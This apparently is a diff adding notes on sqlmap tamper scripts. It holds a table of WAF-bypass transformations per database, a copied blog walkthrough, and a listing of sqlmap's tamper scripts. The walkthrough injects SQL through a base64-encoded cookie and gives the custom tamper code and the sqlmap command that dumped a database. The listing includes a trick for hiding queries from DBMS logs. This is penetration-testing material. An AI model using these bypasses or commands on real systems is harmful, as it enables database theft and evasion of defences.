+equaltolike	Microsoft SQL Server 2005	Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') The LIKE operator is SQL standard. Hence, this tamper script should work against all (?) databases
+equaltolike	MySQL 4	Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') The LIKE operator is SQL standard. Hence, this tamper script should work against all (?) databases
+equaltolike	MySQL 5	Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') The LIKE operator is SQL standard. Hence, this tamper script should work against all (?) databases
+equaltolike	MySQL 5.5	Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') The LIKE operator is SQL standard. Hence, this tamper script should work against all (?) databases
+escapequotes	UNIVERSAL \ NOT DESCRIBED	Slash escape quotes (' and ")
+greatest	MySQL 4	Replaces greater than operator ('>') with 'GREATEST' counterpart. Useful to bypass weak and bespoke web application firewalls that filter the greater than character.The GREATEST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases
+greatest	MySQL 5	Replaces greater than operator ('>') with 'GREATEST' counterpart. Useful to bypass weak and bespoke web application firewalls that filter the greater than character.The GREATEST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases
+greatest	MySQL 5.5	Replaces greater than operator ('>') with 'GREATEST' counterpart. Useful to bypass weak and bespoke web application firewalls that filter the greater than character.The GREATEST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases
+greatest	Oracle 10g	Replaces greater than operator ('>') with 'GREATEST' counterpart. Useful to bypass weak and bespoke web application firewalls that filter the greater than character.The GREATEST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases
+greatest	PostgreSQL 8.3	Replaces greater than operator ('>') with 'GREATEST' counterpart. Useful to bypass weak and bespoke web application firewalls that filter the greater than character.The GREATEST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases
+greatest	PostgreSQL 8.4	Replaces greater than operator ('>') with 'GREATEST' counterpart. Useful to bypass weak and bespoke web application firewalls that filter the greater than character.The GREATEST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases
+greatest	PostgreSQL 9.0	Replaces greater than operator ('>') with 'GREATEST' counterpart. Useful to bypass weak and bespoke web application firewalls that filter the greater than character.The GREATEST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases
+halfversionedmorekeywords	MySQL < 5.1	Adds versioned MySQL comment before each keyword. Useful to bypass several web application firewalls when the back-end database management system is MySQL Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html
+halfversionedmorekeywords	MySQL 4.0.18	Adds versioned MySQL comment before each keyword. Useful to bypass several web application firewalls when the back-end database management system is MySQL Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html
+halfversionedmorekeywords	MySQL 5.0.22	Adds versioned MySQL comment before each keyword. Useful to bypass several web application firewalls when the back-end database management system is MySQL Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html
+htmlencode	UNIVERSAL \ NOT DESCRIBED	HTML encode (using code points) all non-alphanumeric characters
+ifnull2ifisnull	MySQL 5.0	Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' Useful to bypass very weak and bespoke web application firewalls that filter the IFNULL() function
+ifnull2ifisnull	MySQL 5.5	Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' Useful to bypass very weak and bespoke web application firewalls that filter the IFNULL() function
+informationschemacomment	UNIVERSAL \ NOT DESCRIBED	Add a comment to the end of all occurrences of (blacklisted) "information_schema" identifier
+least	MySQL 4	Useful to bypass weak and bespoke web application firewalls that filter the greater than character. The LEAST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases.
+least	MySQL 5	Useful to bypass weak and bespoke web application firewalls that filter the greater than character. The LEAST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases.
+least	MySQL 5.5	Useful to bypass weak and bespoke web application firewalls that filter the greater than character. The LEAST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases.
+least	Oracle 10g	Useful to bypass weak and bespoke web application firewalls that filter the greater than character. The LEAST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases.
+least	PostgreSQL 8.3	Useful to bypass weak and bespoke web application firewalls that filter the greater than character. The LEAST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases.
+least	PostgreSQL 8.4	Useful to bypass weak and bespoke web application firewalls that filter the greater than character. The LEAST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases.
+least	PostgreSQL 9.0	Useful to bypass weak and bespoke web application firewalls that filter the greater than character. The LEAST clause is a widespread SQL command. Hence, this tamper script should work against majority of databases.
+lowercase	Microsoft SQL Server 2005	Replaces each keyword character with lower case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases.
+lowercase	MySQL 4	Replaces each keyword character with lower case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases.
+lowercase	MySQL 5.0	Replaces each keyword character with lower case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases.
+lowercase	MySQL 5.5	Replaces each keyword character with lower case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases.
+lowercase	Oracle 10g	Replaces each keyword character with lower case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases.
+lowercase	PostgreSQL 8.3	Replaces each keyword character with lower case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases.
+lowercase	PostgreSQL 8.4	Replaces each keyword character with lower case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases.
+lowercase	PostgreSQL 9.0	Replaces each keyword character with lower case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases.
+modsecurityversioned	MySQL	Embraces complete query with versioned comment. Useful to bypass ModSecurity WAF/IDS
+modsecurityversioned	MySQL 5.0	Useful to bypass ModSecurity WAF/IDS
+multiplespaces	UNIVERSAL \ NOT DESCRIBED	Adds multiple spaces around SQL keywords. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions Reference: https://www.owasp.org/images/7/74/Advanced_SQL_Injection.ppt
+nonrecursivereplacement	UNIVERSAL \ NOT DESCRIBED	Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters. Useful to bypass very weak custom filters
+overlongutf8	UNIVERSAL \ NOT DESCRIBED	Converts all characters in a given payload (not processing already encoded) Reference: https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/
+percentage	ASP	Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls
+percentage	Microsoft SQL Server 2000	Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls
+percentage	Microsoft SQL Server 2005	Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls
+percentage	MySQL 5.1.56	Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls
+percentage	MySQL 5.5.11	Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls
+percentage	PostgreSQL 9.0	Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls
+plus2concat	Microsoft SQL Server 2012	Replaces plus ('+') character with function CONCAT(). Useful in case ('+') character is filtered.
+plus2concat	Microsoft SQL Server 2012+	Replaces plus ('+') character with function CONCAT(). Useful in case ('+') character is filtered.
+plus2fnconcat	Microsoft SQL Server 2008	Replaces plus ('+') character with ODBC function {fn CONCAT()}. Useful in case ('+') character is filtered https://msdn.microsoft.com/en-us/library/bb630290.aspx
+plus2fnconcat	Microsoft SQL Server 2008+	Replaces plus ('+') character with ODBC function {fn CONCAT()}. Useful in case ('+') character is filtered https://msdn.microsoft.com/en-us/library/bb630290.aspx
+randomcase	Microsoft SQL Server 2005	Replaces each keyword character with random case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+
+ 
+randomcase	MySQL 4	Replaces each keyword character with random case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+
+ 
+randomcase	MySQL 5	Replaces each keyword character with random case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+
+ 
+randomcase	MySQL 5.5	Replaces each keyword character with random case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+
+ 
+randomcase	Oracle 10g	Replaces each keyword character with random case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+
+ 
+randomcase	PostgreSQL 8.3	Replaces each keyword character with random case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+
+ 
+randomcase	PostgreSQL 8.4	Replaces each keyword character with random case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+
+ 
+randomcase	PostgreSQL 9.0	Replaces each keyword character with random case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+
+ 
+randomcomments	UNIVERSAL \ NOT DESCRIBED	Add random comments to SQL keywords.
+securesphere	UNIVERSAL \ NOT DESCRIBED	Appends special crafted string. Useful for bypassing Imperva SecureSphere WAF. Reference: http://seclists.org/fulldisclosure/2011/May/163
+sp_password	MSSQL	Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs. Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure Reference: http://websec.ca/kb/sql_injection
+space2comment	Microsoft SQL Server 2005	Replaces space character (' ') with comments '/**/' Useful to bypass weak and bespoke web application firewalls
+space2comment	MySQL 4	Replaces space character (' ') with comments '/**/' Useful to bypass weak and bespoke web application firewalls
+space2comment	MySQL 5	Replaces space character (' ') with comments '/**/' Useful to bypass weak and bespoke web application firewalls
+space2comment	MySQL 5.5	Replaces space character (' ') with comments '/**/' Useful to bypass weak and bespoke web application firewalls
+space2comment	Oracle 10g	Replaces space character (' ') with comments '/**/' Useful to bypass weak and bespoke web application firewalls
+space2comment	PostgreSQL 8.3	Replaces space character (' ') with comments '/**/' Useful to bypass weak and bespoke web application firewalls
+space2comment	PostgreSQL 8.4	Replaces space character (' ') with comments '/**/' Useful to bypass weak and bespoke web application firewalls
+space2comment	PostgreSQL 9.0	Replaces space character (' ') with comments '/**/' Useful to bypass weak and bespoke web application firewalls
+space2dash	MSSQL	Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n'). Useful to bypass several web application firewalls Used during the ZeroNights SQL injection challenge https://proton.onsec.ru/contest/
+space2dash	SQLite	Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n'). Useful to bypass several web application firewalls Used during the ZeroNights SQL injection challenge https://proton.onsec.ru/contest/
+space2hash	MySQL	Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n'). Useful to bypass several web application firewalls. Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html
+space2hash	MySQL 4.0	Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n'). Useful to bypass several web application firewalls. Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html
+space2hash	MySQL 5.0	Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n'). Useful to bypass several web application firewalls. Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html
+space2morecomment	MySQL 5.0	Replaces space character (' ') with comments '/**_**/' Useful to bypass weak and bespoke web application firewalls
+space2morecomment	MySQL 5.5	Replaces space character (' ') with comments '/**_**/' Useful to bypass weak and bespoke web application firewalls
+space2morehash	MySQL >= 5.1.13	Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
+space2morehash	MySQL 5.1.41	Useful to bypass several web application firewalls. Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html
+space2mssqlblank	Microsoft SQL Server	Replaces space character (' ') with a random blank character from a valid set of alternate characters. Useful to bypass several web application firewalls
+space2mssqlblank	Microsoft SQL Server 2000	Replaces space character (' ') with a random blank character from a valid set of alternate characters. Useful to bypass several web application firewalls
+space2mssqlblank	Microsoft SQL Server 2005	Replaces space character (' ') with a random blank character from a valid set of alternate characters. Useful to bypass several web application firewalls
+space2mssqlhash	MSSQL	Replaces space character (' ') with a pound character ('#') followed by a new line ('\n'). Useful to bypass several web application firewalls
+space2mssqlhash	MySQL	Replaces space character (' ') with a pound character ('#') followed by a new line ('\n'). Useful to bypass several web application firewalls
+space2mysqlblank	MySQL	Replaces space character (' ') with a random blank character from a valid set of alternate characters. Useful to bypass several web application firewalls
+space2mysqlblank	MySQL 5.1	Replaces space character (' ') with a random blank character from a valid set of alternate characters. Useful to bypass several web application firewalls
+space2mysqldash	MySQL	Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n'). Useful to bypass several web application firewalls.
+space2mysqldash	MSSQL	Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n'). Useful to bypass several web application firewalls.
+space2plus	UNIVERSAL \ NOT DESCRIBED	Replaces space character (' ') with plus ('+'). Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards. This tamper script works against all databases
+space2randomblank	Microsoft SQL Server 2005	Replaces space character (' ') with a random blank character from a valid set of alternate characters. Useful to bypass several web application firewalls
+ 
+space2randomblank	MySQL 4.0	Replaces space character (' ') with a random blank character from a valid set of alternate characters. Useful to bypass several web application firewalls
+ 
+space2randomblank	MySQL 5.0	Replaces space character (' ') with a random blank character from a valid set of alternate characters. Useful to bypass several web application firewalls
+ 
+space2randomblank	MySQL 5.5	Replaces space character (' ') with a random blank character from a valid set of alternate characters. Useful to bypass several web application firewalls
+ 
+symboliclogical	UNIVERSAL \ NOT DESCRIBED	Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
+unionalltounion	UNIVERSAL \ NOT DESCRIBED	Replaces UNION ALL SELECT with UNION SELECT
+unmagicquotes	UNIVERSAL \ NOT DESCRIBED	Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work). Useful for bypassing magic_quotes/addslashes feature http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string
+uppercase	Microsoft SQL Server 2005	Replaces each keyword character with upper case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+uppercase	MySQL 4.0	Replaces each keyword character with upper case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+uppercase	MySQL 5.0	Replaces each keyword character with upper case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+uppercase	MySQL 5.5	Replaces each keyword character with upper case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+uppercase	PostgreSQL 8.3	Replaces each keyword character with upper case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+uppercase	PostgreSQL 8.4	Replaces each keyword character with upper case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+uppercase	PostgreSQL 9.0	Replaces each keyword character with upper case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions. This tamper script should work against all (?) databases
+varnish	UNIVERSAL \ NOT DESCRIBED	Append a HTTP header 'X-originating-IP' to bypass WAF Protection of Varnish Firewall Reference: http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366
+versionedkeywords	MySQL	Encloses each non-function keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL
+versionedkeywords	MySQL 4.0.18	Encloses each non-function keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL
+versionedkeywords	MySQL 5.1.56	Encloses each non-function keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL
+versionedkeywords	MySQL 5.5.11	Encloses each non-function keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL
+versionedmorekeywords	MySQL >= 5.1.13	Encloses each keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL
+versionedmorekeywords	MySQL 5.1.56	Encloses each keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL
+versionedmorekeywords	MySQL 5.5.11	Encloses each keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL
+xforwardedfor	UNIVERSAL \ NOT DESCRIBED	Append a fake HTTP header 'X-Forwarded-For' to bypass
+WAF (usually application based) protection
+
+
+
+
+Aricle from internet:Sqlmagic, the Tamper Spell
+ by Mike Sass 
+ posted on July 27, 2021
+Since (at least) 2010, SQL Injection (and other types of Injection) has been number one (A1) on OWASP’s famed OWASP Top Ten list. The OWASP Top 10 (for those who aren’t familiar) represents the top 10 “most critical security risks to web applications” and is developed (by OWASP) using a broad consensus from within the (global) appsec community. “Risk” in this case, is measured not only on severity and impact but also on the relative frequency of the vulnerability class. In other words, SQLi is consistently ranked at the top, year after year, not only because it represents significant risk to any given application (and potentially its underlying infrastructure) but also because it is very frequently found.
+
+There are many variants of SQLi, yet finding and subsequently exploiting this flaw is not always trivial. However, application security professionals have a magic weapon that does exactly this - SQLMAP! (Find it here or in a Kali image near you!)
+
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|
+Before reading any further, know that this is not a guide to using sqlmap. For that, I recommend you check out the Github project for sqlmap and read through it’s usage documentation.
+
+Tamper Scripts
+Let’s discuss the awesomeness that is sqlmap Tamper scripts (invoked using sqlmap via the command-line parameter “--tamper=TAMPER”). To explain Tamper scripts, I’ll start with sqlmap’s own documentation…
+
+sqlmap itself does no obfuscation of the payload sent, except for strings between single quotes replaced by their CHAR()-alike representation.
+
+This option can be very useful and powerful in situations where there is a weak input validation mechanism between you and the back-end database management system. This mechanism usually is a self-developed input validation routine called by the application source code, an expensive enterprise-grade IPS appliance or a web application firewall (WAF). All buzzwords to define the same concept, implemented in a different way and costing lots of money, usually.
+
+To take advantage of this option, provide sqlmap with a comma-separated list of tamper scripts and this will process the payload and return it transformed. You can define your own tamper scripts, use sqlmap ones from the tamper/ folder or edit them as long as you concatenate them comma-separated as value of the option –tamper (e.g. –tamper=”between,randomcase”).
+
+Cool right?! Who doesn’t want to bypass WAFs? In addition to fuzzing / otherwise-testing poor input validation methods, Tamper scripts are also helpful when targeting particularly challenging injection vectors, an example of which I will describe in detail below…
+
+A Difficult Injection Vector
+I recently encountered an interesting SQLi vulnerability that was somewhat difficult to inject into, specifically with sqlmap, which is my go-to SQLi exploitation (and often discovery) utility. To set the scene, the web app in question had a simple GET parameter “id=1”. Naturally I first tried to inject directly into the GET parameter but came up empty both with manual exploitation as well as using sqlmap…
+
+[WARNING] GET parameter ‘id’ does not seem to be injectable
+
+Bummer… Taking a closer look at the application logic, I noticed a cookie was being set as a result of submitting the GET request. The cookie was set as shown below…
+
+Set-Cookie: userchl2_info=%7B%22last_book%22%3A%22MQ%3D%3D%22%2C%22userchl2%22%3A%22%22%7D
+Subsequent requests anywhere within that same subdomain/path would include that cookie value. When (URL-)decoding the cookie value (%7B%22last_book%22%3A%22MQ%3D%3D%22%2C%22userchl2%22%3A%22%22%7D), I get the unencoded value, {“last_book”:”MQ==”,”userchl2”:”“}. I can see that the value for the dictionary pair with key “last_book” appears to be base64 encoded (the equal signs “=”, which serve as base64 padding give this away). Further (base64)-decoding that value I see that MQ== is equal to the value “1”, which is of course the original GET parameter value of id which was also 1!
+
+OK, so now that I know how the GET parameter is stored within the cookie, I then inject a properly encoded (remember we must base64 encode the last_book value as well as URL encode the entire cookie value) apostrophe (‘) into that JSON key/value pair to see if I can’t trigger a SQL error (in typical SQLi testing fashion). After base64 encoding the apostrophe, the result is “Jw==”. After URL encoding the entire payload cookie value I have %7B%22last_book%22%3A%22Jw%3D%3D%22%2C%22userchl2%22%3A%22%22%7D.
+
+Submitting this new payload, I find the following SQL error in the response.
+
+mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in [redacted].php
+
+Eureka! This error demonstrates that I may indeed have a SQLi flaw. To continue to exploit this manually given the multiple encoding steps as well as the need to inject it into a particular location of the cookie value would be exhausting. Why not instead have sqlmap do the heavy lifting? By default, sqlmap does not handle the transforms and pinpoint accuracy required to pull this off. However, with the added functionality of Tamper scripting, we can extend sqlmap’s capabilities and do exactly that.
+
+Becoming a Tampermage
+Sqlmap has a variety of out-of-the-box Tamper scripts, all of which can be found in /share/sqlmap/tamper/. The one’s that come standard as well as any additional home-brewed scripts will all have the general format shown below…
+
+# Needed imports
+from lib.core.enums import PRIORITY
+
+# Define which is the order of application of tamper scripts against
+# the payload
+__priority__ = PRIORITY.NORMAL
+
+def tamper(payload):
+    '''
+    Description of your tamper script
+    '''
+
+    retVal = payload
+
+    # your code to tamper the original payload
+
+    # return the tampered payload
+    return retVal
+Using a (single) Tamper script is easy, you can even chain multiple Tamper scripts together! Example usage is show below…
+
+$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --\
+tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
+Of course, there was no exact out-of-the-box script that would do everything I needed in this particular use-case, so I needed to develop my own from scratch or at least modify an existing script. To get me started, I used the base64encode.py Tamper script as a launch point as I knew I needed to do some base64 encoding. This script in it’s (original) entirety is displayed below…
+
+#!/usr/bin/env python
+
+"""
+Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
+"""
+
+from lib.core.convert import encodeBase64
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Base64-encodes all characters in a given payload
+
+    >>> tamper("1' AND SLEEP(5)#")
+    'MScgQU5EIFNMRUVQKDUpIw=='
+    """
+
+    return encodeBase64(payload, binary=False) if payload else payload
+Alright, so this is a good start. Let’s recap what I need out of my final Tamper script in order to inject the properly encoded payload in the exact right location…
+
+I need to inject into the userchl2_info cookie value.
+The payloads generated by sqlmap must be wrapped in the JSON dict {“last_book”:”[PAYLOAD]”,”userchl2”:”“} (which is the properly formatted value for the injectable cookie).
+sqlmap payloads must be base64-encoded.
+The entire cookie value must be URL-encoded.
+OK… so to do this, I changed the final return statement in the original base64encode.py Tamper script to the return statement shown below…
+
+return urllib.parse.quote_plus('{"last_book":"' + encodeBase64("9999" + payload[1:],binary=False) + '","userchl2":""}')
+Quickly decomposing this one-liner as it relates to my previously stated requirements…
+
+I can inject my (tamper-transformed) payloads into the cookie as part of a sqlmap command by setting the --cookie parameter to ‘--cookie=”userchl2_info=”‘.
+In the new return statement, I have {“last_book”:”’ + [PAYLOAD STUFF] + ‘”,”userchl2”:”“} which satisfies the JSON wrap.
+Using encodeBase64(“9999” + payload[1:],binary=False), I am able to encode the inner-payload as base64.
+Finally I use urllib.parse.quote_plus(…) to URL-encode the cookie value in it’s totality.
+Putting this all-together in my sqlmap command…
+
+sqlmap -u "[redacted].php?id=1" --cookie="userchl2_info=" -p "userchl2_info" --tamper="/usr/share/sqlmap/tamper/base64encode2.py" --dbms=MySQL --not-string="expects parameter 1 to be resource" --level=3
+* Remember I discovered the DB was MySQL earlier when I first triggered the SQL error.
+* I also discovered the “--not-string” when I first triggered the original SQL error.
+* I’m not sure why (some more digging is needed), but for this to work, sqlmap must be run with Level 3, --level=3.
+
+Running this command I get a lot of output - most importantly I see…
+
+[INFO] heuristic (basic) test shows that Cookie parameter ‘userchl2_info’ might be injectable (possible DBMS: ‘MySQL’)
+Cookie parameter ‘userchl2_info’ is ‘Generic UNION query (NULL) - 1 to 20 columns’ injectable
+Cookie parameter ‘userchl2_info’ is vulnerable.
+
+In other words, this injection vector was successful and I was indeed able to dump the database. The big takeaway here is that Tamper scripts are awesome and you can easily create your own which can precisely target and ruthlessly fuzz potential injection vectors.
+
+I now don my  and graduate as a sql(map) Tamper-wiz!
+
+
+
+[16:27:44] [INFO] listing available tamper scripts
+
+* 0eunion.py - Replaces instances of <int> UNION with <int>e0UNION
+* apostrophemask.py - Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)
+* apostrophenullencode.py - Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)
+* appendnullbyte.py - Appends (Access) NULL byte character (%00) at the end of payload
+* base64encode.py - Base64-encodes all characters in a given payload
+* between.py - Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'
+* binary.py - Injects keyword binary where possible
+* bluecoat.py - Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE
+* chardoubleencode.py - Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)
+* charencode.py - URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)
+* charunicodeencode.py - Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)
+* charunicodeescape.py - Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)
+* commalesslimit.py - Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart
+* commalessmid.py - Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart
+* commentbeforeparentheses.py - Prepends (inline) comment before parentheses (e.g. ( -> /**/()
+* concat2concatws.py - Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart
+* decentities.py - HTML encode in decimal (using code points) all characters (e.g. ' -> &#39;)
+* dunion.py - Replaces instances of <int> UNION with <int>DUNION
+* equaltolike.py - Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart
+* equaltorlike.py - Replaces all occurrences of operator equal ('=') with 'RLIKE' counterpart
+* escapequotes.py - Slash escape single and double quotes (e.g. ' -> \')
+* greatest.py - Replaces greater than operator ('>') with 'GREATEST' counterpart
+* halfversionedmorekeywords.py - Adds (MySQL) versioned comment before each keyword
+* hex2char.py - Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart
+* hexentities.py - HTML encode in hexadecimal (using code points) all characters (e.g. ' -> &#x31;)
+* htmlencode.py - HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)
+* if2case.py - Replaces instances like 'IF(A, B, C)' with 'CASE WHEN (A) THEN (B) ELSE (C) END' counterpart
+* ifnull2casewhenisnull.py - Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart
+* ifnull2ifisnull.py - Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart
+* informationschemacomment.py - Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier
+* least.py - Replaces greater than operator ('>') with 'LEAST' counterpart
+* lowercase.py - Replaces each keyword character with lower case value (e.g. SELECT -> select)
+* luanginx.py - LUA-Nginx WAFs Bypass (e.g. Cloudflare)
+* misunion.py - Replaces instances of UNION with -.1UNION
+* modsecurityversioned.py - Embraces complete query with (MySQL) versioned comment
+* modsecurityzeroversioned.py - Embraces complete query with (MySQL) zero-versioned comment
+* multiplespaces.py - Adds multiple spaces (' ') around SQL keywords
+* ord2ascii.py - Replaces ORD() occurences with equivalent ASCII() calls
+* overlongutf8.py - Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)
+* overlongutf8more.py - Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
+* percentage.py - Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)
+* plus2concat.py - Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart
+* plus2fnconcat.py - Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart
+* randomcase.py - Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
+* randomcomments.py - Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
+* schemasplit.py - Splits FROM schema identifiers (e.g. 'testdb.users') with whitespace (e.g. 'testdb 9.e.users')
+* scientific.py - Abuses MySQL scientific notation
+* sleep2getlock.py - Replaces instances like 'SLEEP(5)' with (e.g.) "GET_LOCK('ETgP',5)"
+* sp_password.py - Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
+* space2comment.py - Replaces space character (' ') with comments '/**/'
+* space2dash.py - Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')
+* space2hash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
+* space2morecomment.py - Replaces (MySQL) instances of space character (' ') with comments '/**_**/'
+* space2morehash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
+* space2mssqlblank.py - Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
+* space2mssqlhash.py - Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')
+* space2mysqlblank.py - Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
